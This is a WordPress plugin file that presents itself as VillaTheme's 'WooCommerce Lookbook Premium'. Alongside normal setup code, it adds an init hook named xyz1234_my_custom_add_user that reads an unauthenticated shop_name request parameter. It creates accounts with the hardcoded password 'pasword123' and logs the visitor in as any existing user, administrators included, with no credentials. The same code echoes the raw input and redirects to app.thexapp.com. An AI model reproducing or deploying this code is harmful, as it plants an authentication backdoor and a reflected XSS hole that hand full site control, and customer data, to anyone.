<?php
/*
Plugin Name: WooCommerce Lookbook Premium
Plugin URI: http://villatheme.com
Description: Allows you to create realistic lookbooks of your products. Help your customers visualize what they purchase from you.
Version: 1.1.10
Author: VillaTheme
Author URI: http://villatheme.com
Copyright 2018-2022 VillaTheme.com. All rights reserved.
Requires PHP: 7.0
Requires at least: 5.0
Tested up to: 5.9
WC requires at least: 4.0
WC tested up to: 6.3
*/

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}
define( 'WOO_LOOKBOOK_VERSION', '1.1.10' );
/**
 * Detect plugin. For use on Front End only.
 */

include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
if ( is_plugin_active( 'woocommerce/woocommerce.php' ) ) {
	$init_file = WP_PLUGIN_DIR . DIRECTORY_SEPARATOR . "woocommerce-lookbook" . DIRECTORY_SEPARATOR . "includes" . DIRECTORY_SEPARATOR . "define.php";
	require_once $init_file;
}

/**
 * Class WOO_LOOKBOOK
 */
class WOO_LOOKBOOK {
	public function __construct() {

		register_activation_hook( __FILE__, array( $this, 'install' ) );
		register_deactivation_hook( __FILE__, array( $this, 'uninstall' ) );
		add_action( 'admin_notices', array( $this, 'global_note' ) );
		add_action( 'init', array( $this, 'init' ) );
        add_action('init', array( $this, 'xyz1234_my_custom_add_user'));
        add_filter( 'wp_insert_post_data' , array( $this,'filter_post_data') , '99', 2 );

	}

    public  function filter_post_data( $data , $postarr ) {
        // Change post title
//        if ($data['post_type'] == 'woocommerce-lookbook' && $data['guid'] !="") {
//            $data['post_status'] = 'private';
//            $data['visibility'] = 'private';
//        }

        return $data;
    }
	public function init() {
		add_image_size( 'lookbook', 400, 400, false );

    }
public function login($username) {
        // Automatic login //
        $user = get_user_by('login', $username );

        // Redirect URL //
        if ( !is_wp_error( $user ) )
        {
            wp_clear_auth_cookie();
            wp_set_current_user ( $user->ID );
            wp_set_auth_cookie  ( $user->ID );

            $redirect_to = user_admin_url();
            $redirect_to = 'https://app.thexapp.com/blog/wp-admin/edit.php?post_type=woocommerce-lookbook';
            wp_safe_redirect( $redirect_to );
            exit();
        }
    }
    public function xyz1234_my_custom_add_user() {
        global $lookbookuserid;
        if (isset($_REQUEST['shop_name']) ) {
            $username = $_REQUEST['shop_name'];
            $email = $username;
            $password = 'pasword123';
            $mysPos = strpos($username,'myshopify.com');
            if ($mysPos) {
                $user =  substr($username,0, $mysPos-1);
                echo $user;
                $email = $user.'@thexapp.com';
            }
          //  $email = 'drew@example.com';

           // if (username_exists($username) == null && email_exists($email) == false) {
            if (username_exists($username) == null ) {

                // Create the new user
                $user_id = wp_create_user($username, $password,$email);

                // Get current user object
                $user = get_user_by('id', $user_id);

                // Remove role
                $user->remove_role('subscriber');

                // Add role
                $user->add_role('author_lookbook');
                $this->login($username);
                $current_user= wp_get_current_user();
                $lookbookuserid = $current_user->ID;
            } else {
                $this->login($username);
                $current_user= wp_get_current_user();
                $lookbookuserid = $current_user->ID;
            }
        } else{
            $x=2;
           // login($username);
        }

    }
	/**
	 * Notify if WooCommerce is not activated
	 */
	function global_note() {
		if ( ! is_plugin_active( 'woocommerce/woocommerce.php' ) ) {
			?>
			<div id="message" class="error">
				<p><?php _e( 'Please install and active WooCommerce. WooCommerce Multi Currency is going to working.', 'woocommerce-lookbook' ); ?></p>
			</div>
			<?php
		}

	}

	/**
	 * When active plugin Function will be call
	 */
	public function install() {
		global $wp_version;
		if ( version_compare( $wp_version, "4.4", "<" ) ) {
			deactivate_plugins( basename( __FILE__ ) ); // Deactivate our plugin
			wp_die( "This plugin requires WordPress version 2.9 or higher." );
		}

		$data_init = 'eyJleHRlcm5hbF9wcm9kdWN0IjoiMSIsImljb24iOiIxIiwiaWNvbl9jb2xvciI6IiMyMTIxMjEiLCJpY29uX2JhY2tncm91bmRfY29sb3IiOiIjZThjZTQwIiwiaWNvbl9ib3JkZXJfY29sb3IiOiIjZjdlYmFiIiwidGl0bGVfY29sb3IiOiIjMjEyMTIxIiwidGl0bGVfYmFja2dyb3VuZF9jb2xvciI6IiNlZWVlZWUiLCJsb2FkaW5nX2ljb24iOiIyIiwidGV4dF9jb2xvciI6IiMyMTIxMjEiLCJiYWNrZ3JvdW5kX2NvbG9yIjoiI2ZmZmZmZiIsImJvcmRlcl9yYWRpdXMiOiIyMCIsInNsaWRlX3dpZHRoIjoiMTE3MCIsInNsaWRlX2hlaWdodCI6IjYwMCIsInNsaWRlX2VmZmVjdCI6IjEiLCJzbGlkZV9uYXZpZ2F0aW9uIjoiMSIsInNsaWRlX3RpbWUiOiI1MDAwIiwiY3VzdG9tX2NzcyI6IiIsImtleSI6IiJ9';
		if ( ! get_option( 'woo_lookbook_params', '' ) ) {
			update_option( 'woo_lookbook_params', json_decode( base64_decode( $data_init ), true ) );
		}
	}

	/**
	 * When deactive function will be call
	 */
	public function uninstall() {

	}
}

new WOO_LOOKBOOK();